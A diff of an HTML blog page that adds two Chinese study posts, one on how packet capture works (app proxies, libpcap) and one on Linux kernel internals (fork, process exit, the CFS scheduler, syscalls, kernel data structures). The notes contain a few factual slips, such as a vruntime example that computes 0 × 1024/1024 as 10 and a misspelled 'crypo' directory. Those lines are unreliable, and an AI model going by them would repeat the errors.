@@ -156,6 +156,680 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">网络相关知识：网络抓包原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-19 10:51:24 / Modified: 10:53:35" itemprop="dateCreated datePublished" datetime="2022-08-19T10:51:24+08:00">2022-08-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>556</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="手机-App-抓包"><a href="#手机-App-抓包" class="headerlink" title="手机 App 抓包"></a>手机 App 抓包</h2><p>要实现对 App 的网络数据抓包，需要监控 App 与服务器交互之间的网络节点，监控其中任意一个网络节点（网卡），获取所有经过网卡中的数据，对这些数据按照网络协议进行解析，这就是抓包的基本原理</p>
+<p>但是中间网络节点，不受我们控制，所以基本无法实现抓包的，只能在客户端和服务端进行抓包</p>
+<p>通常我们监控本地网卡数据，如下图： </p>
+<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838000697.png" class width="1660838000697"> 
+<p><code>本地网络</code> 指的是WIFI的路由，如果直接抓路由器的包还是比较麻烦的，因此我们会在 <code>手机</code> 和 <code>本地路由</code> 之间加一层 <code>代理服务</code>，这样只要抓代理服务的网络数据即可：</p>
+<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838017257.png" class width="1660838017257"> 
+<h2 id="Linux-抓包"><a href="#Linux-抓包" class="headerlink" title="Linux 抓包"></a>Linux 抓包</h2><p>Linux 抓包是通过 <strong>注册一种虚拟的底层网络协议</strong> 来完成对网络报文（准确的说是网络设备）消息的处理权</p>
+<ul>
+<li>当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议（例如，以太网协议，x25协议处理模块）来尝试进行报文的解析处理（这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载）</li>
+<li><p>当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块 </p>
+<p>具体是使用 libpcap 获取被监听网络接口的数据 </p>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Linux内核学习笔记（持续更新）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-08-18 23:38:46" itemprop="dateCreated datePublished" datetime="2022-08-18T23:38:46+08:00">2022-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-08-19 17:40:17" itemprop="dateModified" datetime="2022-08-19T17:40:17+08:00">2022-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>12 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Linux-内核简述"><a href="#Linux-内核简述" class="headerlink" title="Linux 内核简述"></a>Linux 内核简述</h2><p>Linux 的内核虽然是基于单内核的，但是经过这么多年的发展，也具备微内核的一些特征（体现了 Linux 实用至上的原则）</p>
+<p>主要有以下特征：</p>
+<ul>
+<li>支持动态加载内核模块</li>
+<li>支持对称多处理（SMP）</li>
+<li>内核可以抢占（preemptive），允许内核运行的任务有优先执行的能力</li>
+<li>不区分线程和进程</li>
+</ul>
+<h2 id="Linux-内核源码的结构"><a href="#Linux-内核源码的结构" class="headerlink" title="Linux 内核源码的结构"></a>Linux 内核源码的结构</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>目录</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>arch</td>
+<td>特定体系结构的代码</td>
+</tr>
+<tr>
+<td>block</td>
+<td>块设备I/O层</td>
+</tr>
+<tr>
+<td>crypo</td>
+<td>加密API</td>
+</tr>
+<tr>
+<td>Documentation</td>
+<td>内核源码文档</td>
+</tr>
+<tr>
+<td>drivers</td>
+<td>设备驱动程序</td>
+</tr>
+<tr>
+<td>firmware</td>
+<td>使用某些驱动程序而需要的设备固件</td>
+</tr>
+<tr>
+<td>fs</td>
+<td>VFS和各种文件系统</td>
+</tr>
+<tr>
+<td>include</td>
+<td>内核头文件</td>
+</tr>
+<tr>
+<td>init</td>
+<td>内核引导和初始化</td>
+</tr>
+<tr>
+<td>ipc</td>
+<td>进程间通信代码</td>
+</tr>
+<tr>
+<td>kernel</td>
+<td>像调度程序这样的核心子系统</td>
+</tr>
+<tr>
+<td>lib</td>
+<td>同样内核函数</td>
+</tr>
+<tr>
+<td>mm</td>
+<td>内存管理子系统和VM</td>
+</tr>
+<tr>
+<td>net</td>
+<td>网络子系统</td>
+</tr>
+<tr>
+<td>samples</td>
+<td>示例，示范代码</td>
+</tr>
+<tr>
+<td>scripts</td>
+<td>编译内核所用的脚本</td>
+</tr>
+<tr>
+<td>security</td>
+<td>Linux 安全模块</td>
+</tr>
+<tr>
+<td>sound</td>
+<td>语音子系统</td>
+</tr>
+<tr>
+<td>usr</td>
+<td>早期用户空间代码（所谓的initramfs）</td>
+</tr>
+<tr>
+<td>tools</td>
+<td>在Linux开发中有用的工具</td>
+</tr>
+<tr>
+<td>virt</td>
+<td>虚拟化基础结构</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程和线程是程序运行时状态，是动态变化的，进程和线程的管理操作（比如，创建，销毁等）都是有内核来实现的</p>
+<p>Windows：开启的一个程序就是一个线程，它只是一个容器，用于装载系统资源，它并不执行代码，它是系统资源分配的最小单元，而在进程中执行代码的是线程，是代码执行的最小单位</p>
+<p>Linux：Linux 中的进程于 Windows 相比是很轻量级的，而且不严格区分进程和线程，Linux 的进程就是 Windows 中的线程，线程就是轻量级的进程</p>
+<p><strong>Linux 进程的创建</strong></p>
+<p>Linux 中创建进程与其他系统有个主要区别，Linux 中创建进程分2步：fork() 和 exec() </p>
+<ul>
+<li>fork：通过拷贝当前进程创建一个子进程</li>
+<li>exec：读取可执行文件，将其载入到内存中运行</li>
+</ul>
+<p>创建的流程： </p>
+<ul>
+<li>fork() 的底层是 _do_fork()，在其中会调用 copy_process()</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = copy_process(clone_flags, stack_start, stack_size,</span><br><span class="line">		 child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用 dup_task_struct() 为新进程分配内核栈，task_struct 等，其中的内容与父进程相同</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = dup_task_struct(current, node); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>check 新进程（进程数目是否超出上限等）</li>
+<li>清理新进程的信息（比如 PID 置0等），使之与父进程区别开</li>
+<li>新进程状态置为 TASK_UNINTERRUPTIBLE</li>
+<li>更新 task_struct 的 flags 成员</li>
+<li>执行调度程序相关设置，将此任务分配给 CPU，然后调用 copy 系列函数复制所有进程信息</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">shm_init_task(p);</span><br><span class="line">retval = security_task_alloc(p, clone_flags);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_audit;</span><br><span class="line">retval = copy_semundo(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_security;</span><br><span class="line">retval = copy_files(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_semundo;</span><br><span class="line">retval = copy_fs(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_files;</span><br><span class="line">retval = copy_sighand(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_fs;</span><br><span class="line">retval = copy_signal(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_sighand;</span><br><span class="line">retval = copy_mm(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_signal;</span><br><span class="line">retval = copy_namespaces(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_mm;</span><br><span class="line">retval = copy_io(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_namespaces;</span><br><span class="line">retval = copy_thread_tls(clone_flags, stack_start, stack_size, p, tls);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_io;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用 alloc_pid() 为新进程分配一个有效的PID（copy_process() 返回）</li>
+<li>根据 clone() 的参数标志 clone_flags，拷贝或共享相应的信息</li>
+<li>做一些扫尾工作并返回新进程指针</li>
+</ul>
+<p>用户态创建进程的 fork() 函数实际上最终是调用 clone() 系统调用，创建线程和进程的步骤一样，只是最终传给 clone() 的参数不同</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ea1f3d</span> &lt;fork+<span class="number">77</span>&gt;    syscall  &lt;SYS_clone&gt;</span><br><span class="line">       fn: <span class="number">0x1200011</span></span><br><span class="line">       child_stack: <span class="number">0x0</span></span><br><span class="line">       flags: <span class="number">0x0</span></span><br><span class="line">       arg: <span class="number">0x7ffff7fb2810</span> ◂— <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>在内核中创建的内核线程与普通的进程之间还有个主要区别在于：</p>
+<ul>
+<li>内核线程没有独立的地址空间，它们只能在内核空间运行</li>
+<li>这与之前提到的 Linux 内核是个单内核有关</li>
+</ul>
+<p><strong>Linux 进程的终止</strong></p>
+<p>和创建进程一样，终结一个进程同样有很多步骤：</p>
+<p>子进程上的操作：（do_exit）</p>
+<ul>
+<li>设置 task_struct 中的标识成员设置为 PF_EXITING</li>
+<li>调用 del_timer_sync() 删除内核定时器, 确保没有定时器在排队和运行</li>
+<li>调用 exit_mm() 释放进程占用的 mm_struct</li>
+<li>调用 sem__exit() ，使进程离开等待 IPC 信号的队列</li>
+<li>调用 exit_files() 和 exit_fs()，释放进程占用的文件描述符和文件系统资源</li>
+<li>把 task_struct 的 exit_code 设置为进程的返回值</li>
+<li>调用 exit_notify() 向父进程发送信号，并把自己的状态设为 EXIT_ZOMBIE</li>
+<li>切换到新进程继续执行</li>
+</ul>
+<p>子进程进入 EXIT_ZOMBIE 之后，虽然永远不会被调度，关联的资源也释放掉了，但是它本身占用的内存还没有释放（比如：创建时分配的内核栈，task_struct 结构等），这些由父进程来释放</p>
+<p>父进程上的操作：（release_task）</p>
+<ul>
+<li>父进程受到子进程发送的 exit_notify() 信号后，将该子进程的进程描述符和所有进程独享的资源全部删除</li>
+</ul>
+<p>从上面的步骤可以看出，必须要确保每个子进程都有父进程，如果父进程在子进程结束之前就已经结束了会怎么样呢？</p>
+<ul>
+<li>子进程在调用 exit_notify() 时已经考虑到了这点</li>
+<li>如果子进程的父进程已经退出了，那么子进程在退出时，exit_notify() 函数会先调用 forget_original_parent() ，然后再调用 find_new_reaper() 来寻找新的父进程</li>
+<li>find_new_reaper() 函数先在当前线程组中找一个线程作为父亲，如果找不到，就让 init 做父进程（init 进程是在 linux 启动时就一直存在的）</li>
+</ul>
+<h2 id="进程的调度"><a href="#进程的调度" class="headerlink" title="进程的调度"></a>进程的调度</h2><p>现在的操作系统都是多任务的，为了能让更多的任务能同时在系统上更好的运行，需要一个管理程序来管理计算机上同时运行的各个任务（也就是进程）</p>
+<p>这个管理程序就是调度程序，它的功能说起来很简单：</p>
+<ul>
+<li>决定哪些进程运行，哪些进程等待</li>
+<li>决定每个进程运行多长时间</li>
+</ul>
+<p>此外，为了获得更好的用户体验，运行中的进程还可以立即被其他更紧急的进程打断</p>
+<p>总之，调度是一个平衡的过程：</p>
+<ul>
+<li>一方面，它要保证各个运行的进程能够最大限度的使用CPU（即尽量少的切换进程，进程切换过多，CPU的时间会浪费在切换上）</li>
+<li>另一方面，保证各个进程能公平的使用CPU（即防止一个进程长时间独占CPU的情况）</li>
+</ul>
+<p><strong>完全公平调度器 CFS</strong></p>
+<p>前面说过，调度功能就是决定哪个进程运行以及进程运行多长时间</p>
+<p>进程的优先级有2种度量方法，一种是 nice 值，一种是实时优先级：（实时优先级 &gt; nice 值）</p>
+<ul>
+<li>nice 值的范围是 -20～19，值越大优先级越低，也就是说 nice 值为 -20 的进程优先级最大</li>
+<li>实时优先级的范围是 0～99，与 nice 值的定义相反，实时优先级是值越大优先级越高</li>
+</ul>
+<p>实时进程都是一些对响应时间要求比较高的进程，因此系统中有实时优先级高的进程处于运行队列的话，它们会抢占一般的进程的运行时间</p>
+<p>介绍下 CFS：</p>
+<ul>
+<li>CFS 使用红黑树结构，来存储要调度的任务队列</li>
+<li>每个节点代表了一个要调度的任务，节点的 key 即为虚拟时间（vruntime），虚拟时间由这个人物的运行时间计算而来</li>
+<li>key 越小，也就是 vruntime 越小的话，红黑树对应的节点就越靠左</li>
+<li>CFS scheduler 每次都挑选最左边的节点作为下一个要运行的任务，这个节点是“缓存的”，由一个特殊的指针指向，不需要进行 <code>O(logn)</code> 遍历来查找，也因此，CFS 搜索的时间是 <code>O(1)</code></li>
+</ul>
+<p>vruntime(key) 的计算公式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += 实际运行时间(time process run) * <span class="number">1024</span> / 进程权重(load weight of <span class="keyword">this</span> process)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>实际运行时间：该程序已经运行了多久 </li>
+<li>进程权重：根据任务的 nice 值进行索引</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> prio_to_weight[<span class="number">40</span>] = &#123;</span><br><span class="line"> <span class="comment">/* -20 */</span>     <span class="number">88761</span>,     <span class="number">71755</span>,     <span class="number">56483</span>,     <span class="number">46273</span>,     <span class="number">36291</span>,</span><br><span class="line"> <span class="comment">/* -15 */</span>     <span class="number">29154</span>,     <span class="number">23254</span>,     <span class="number">18705</span>,     <span class="number">14949</span>,     <span class="number">11916</span>,</span><br><span class="line"> <span class="comment">/* -10 */</span>      <span class="number">9548</span>,      <span class="number">7620</span>,      <span class="number">6100</span>,      <span class="number">4904</span>,      <span class="number">3906</span>,</span><br><span class="line"> <span class="comment">/*  -5 */</span>      <span class="number">3121</span>,      <span class="number">2501</span>,      <span class="number">1991</span>,      <span class="number">1586</span>,      <span class="number">1277</span>,</span><br><span class="line"> <span class="comment">/*   0 */</span>      <span class="number">1024</span>,       <span class="number">820</span>,       <span class="number">655</span>,       <span class="number">526</span>,       <span class="number">423</span>,</span><br><span class="line"> <span class="comment">/*   5 */</span>       <span class="number">335</span>,       <span class="number">272</span>,       <span class="number">215</span>,       <span class="number">172</span>,       <span class="number">137</span>,</span><br><span class="line"> <span class="comment">/*  10 */</span>       <span class="number">110</span>,        <span class="number">87</span>,        <span class="number">70</span>,        <span class="number">56</span>,        <span class="number">45</span>,</span><br><span class="line"> <span class="comment">/*  15 */</span>        <span class="number">36</span>,        <span class="number">29</span>,        <span class="number">23</span>,        <span class="number">18</span>,        <span class="number">15</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>相当于 nice 和 weight 是等价的，但是不同 nice 值的任务权重差别变大了</li>
+</ul>
+<p>例子：现在我们有一个刚来的进程 [time=0，nice=0，priority=1024]：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += <span class="number">0</span> * <span class="number">1024</span> / <span class="number">1024</span> = <span class="number">10</span> <span class="comment">/* vruntime有一个最小值min_vruntime */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>vruntime 并不是无限小的，有一个最小值来限定 min_vruntime </li>
+<li>假如新进程的 vruntime 初值为0的话，比老进程的值小很多，那么它在相当长的时间内都会保持抢占CPU的优势，老进程就要饿死了，这显然是不公平的</li>
+</ul>
+<p>CFS 是这样做的：每个CPU的运行队列 cfs_rq 都维护一个 min_vruntime 字段，记录该运行队列中所有进程的 vruntime 最小值，新进程的初始 vruntime 值就以它所在运行队列的 min_vruntime 为基础来设置，与老进程保持在合理的差距范围内</p>
+<p>对于新任务来说，vruntime = 0（任务：用于完成某个操作的一组 [进程,线程]，用 <code>task_struct</code> 结构体来描述）</p>
+<p><strong>关于时间片</strong></p>
+<p>决定哪个进程运行以及运行多长时间都和进程的优先级有关，但是对于调度程序来说，并不是运行一次就结束了，还必须知道间隔多久进行下次调度</p>
+<p>为了确定一个进程到底能持续运行多长时间，调度中还引入了时间片的概念，也可以认为是进程在下次调度发生前运行的时间（除非进程主动放弃CPU，或者有实时进程来抢占CPU）</p>
+<p>时间片的大小设置并不简单：</p>
+<ul>
+<li>设大了，系统响应变慢（调度周期长）</li>
+<li>设小了，进程频繁切换带来的处理器消耗</li>
+<li>默认的时间片一般是10ms</li>
+</ul>
+<p><strong>调度策略</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>策略</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SCHED_NORMAL</td>
+<td>普通的分时进程，使用的 fair_sched_class 调度类</td>
+</tr>
+<tr>
+<td>SCHED_FIFO</td>
+<td>先进先出的实时进程，当调用程序把CPU分配给进程的时候，它把该进程描述符保留在运行队列链表的当前位置，此调度策略的进程一旦使用CPU则一直运行，如果没有其他可运行的更高优先级实时进程，进程就继续使用CPU，想用多久就用多久，即使还有其他具有相同优先级的实时进程处于可运行状态，使用的是 rt_sched_class 调度类</td>
+</tr>
+<tr>
+<td>SCHED_RR</td>
+<td>时间片轮转的实时进程，当调度程序把CPU分配给进程的时候，它把该进程的描述符放在运行队列链表的末尾，这种策略保证对所有具有相同优先级的 SCHED_RR 实时进程进行公平分配CPU时间，使用的 rt_sched_class 调度类</td>
+</tr>
+<tr>
+<td>SCHED_BATCH</td>
+<td>是 SCHED_NORMAL 的分化版本，采用分时策略，根据动态优先级，分配CPU资源，在有实时进程的时候，实时进程优先调度，但针对吞吐量优化，除了不能抢占外与常规进程一样，允许任务运行更长时间，更好使用高速缓存，适合于成批处理的工作，使用的 fair_shed_class 调度类</td>
+</tr>
+<tr>
+<td>SCHED_IDLE</td>
+<td>优先级最低，在系统空闲时运行，使用的是 idle_sched_class 调度类，给0号进程使用</td>
+</tr>
+<tr>
+<td>SCHED_DEADLINE</td>
+<td>新支持的实时进程调度策略，针对突发型计算，并且对延迟和完成时间敏感的任务使用，基于 EDF（earliest deadline first），使用的是 dl_sched_class 调度类</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>简单来说，系统调用就是用户程序和硬件设备之间的桥梁，用户程序在需要的时候，通过系统调用来使用硬件设备</p>
+<p>系统调用的存在，有以下重要的意义：</p>
+<ul>
+<li>用户程序通过系统调用来使用硬件，而不用关心具体的硬件设备，这样大大简化了用户程序的开发 </li>
+<li>系统调用使得用户程序有更好的可移植性</li>
+<li>系统调用使得内核能更好的管理用户程序，增强了系统的稳定性 </li>
+<li>系统调用有效的分离了用户程序和内核的开发</li>
+</ul>
+<p>用户程序，系统调用，内核，硬件设备的调用关系如下图： </p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660827734080-1660902016579.png" class width="1660827734080"> 
+<p>要想实现系统调用，主要实现以下几个方面：</p>
+<ul>
+<li>通知内核调用一个哪个系统调用（系统调用号）</li>
+<li>用户程序把系统调用的参数传递给内核（前5个参数放在 [ebx,ecx,edx,esi,edi] 中，如果参数多的话，还需要用个单独的寄存器存放指向所有参数在用户空间地址的指针）</li>
+<li>用户程序获取内核返回的系统调用返回值（获取系统调用的返回值也是通过寄存器，在x86系统上，返回值放在 [eax] 中）</li>
+</ul>
+<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><p>Linux 中4个基本的内核数据结构：链表，队列，映射，红黑树</p>
+<p><strong>链表</strong></p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832270823-1660902016580.png" class width="1660832270823"> 
+<ul>
+<li>有个单独的头结点（head）</li>
+<li>每个节点（node）除了包含必要的数据之外，还有2个指针（pre,next）</li>
+<li>pre 指针指向前一个节点（node），next 指针指向后一个节点（node）</li>
+<li>头结点（head）的 pre 指针指向链表的最后一个节点</li>
+<li>最后一个节点的next指针指向头结点（head）</li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832773428-1660902016580.png" class width="1660832773428"> 
+<ul>
+<li>其实就是把数据放在前面了而已</li>
+</ul>
+<p><strong>队列</strong></p>
+<p>内核中的队列是以字节形式保存数据的，所以获取数据的时候，需要知道数据的大小，如果从队列中取得数据时指定的大小不对的话，取得数据会不完整或过大</p>
+<ul>
+<li>队列是限制在两端进行插入操作和删除操作的线性表，允许进行存入操作的一端称为“队尾”，允许进行删除操作的一端称为“队头”</li>
+<li>当线性表中没有元素时，称为“空队”</li>
+<li>特点：先进先出（FIFO）</li>
+</ul>
+<p>顺序队列：</p>
+<p>建立顺序队列结构必须为其静态分配或动态申请一片连续的存储空间，并设置两个指针进行管理：</p>
+<ul>
+<li>一个是队头指针 front，它指向队头元素</li>
+<li>另一个是队尾指针 rear，它指向下一个入队元素的存储位置 </li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834074319-1660902016580.png" class width="1660834074319"> 
+<p>链式队列：</p>
+<p>一个链队列显然需要两个分别指示队头和队尾的指针（分别成为头指针和尾指针）才能唯一确定：</p>
+<ul>
+<li>这里，和线性表的单链表一样，为了操作方便起见，我们也给队列添加一个头结点，并令头指针指向头节点</li>
+<li>由此，空的链队列的判决条件为头指针和尾指针均指向头结点</li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834323260-1660902016580.png" class width="1660834323260"> 
+<p><strong>映射</strong></p>
+<p>映射（也称为关联数组）是实现（key，value）绑定的一种数据结构（有点像其他语言中的字典类型），每个唯一的ID对应一个自定义的数据结构</p>
+<p>在 Linux 中的使用案例就是：整数ID管理机制（IDR）</p>
+<ul>
+<li>IDR 是用于将 uid 和一个数据地址进行绑定的一种映射</li>
+<li>IDR 把每一个ID分级数据进行管理，每一级维护着ID的5位数据，这样就可以把IDR分为7级进行管理</li>
+<li>IDR 底层使用了 redix 树 </li>
+</ul>
+<p>IDR 怎么对于数据ID管理呢？传统上我们对于未使用的ID进行管理的时候可以使用位图进行管理，也可以使用数组进行管理，也可以使用链表进行ID管理，三个个各有优缺点：</p>
+<ul>
+<li>使用位图进行管理：使用空间少，但是对于位图对应的数据结构支持不太友好</li>
+<li>使用数组进行管理：寻址快速，但是只能管理比较少量的ID数目</li>
+<li>使用链表进行管理：可以支持大量的数据ID，但是通过链表的指针寻址比较慢</li>
+</ul>
+<p>而 IDR 管理可以集合以上3者的优点</p>
+<p>IDR 中有两个数据结构：idr 和 idr_layer </p>
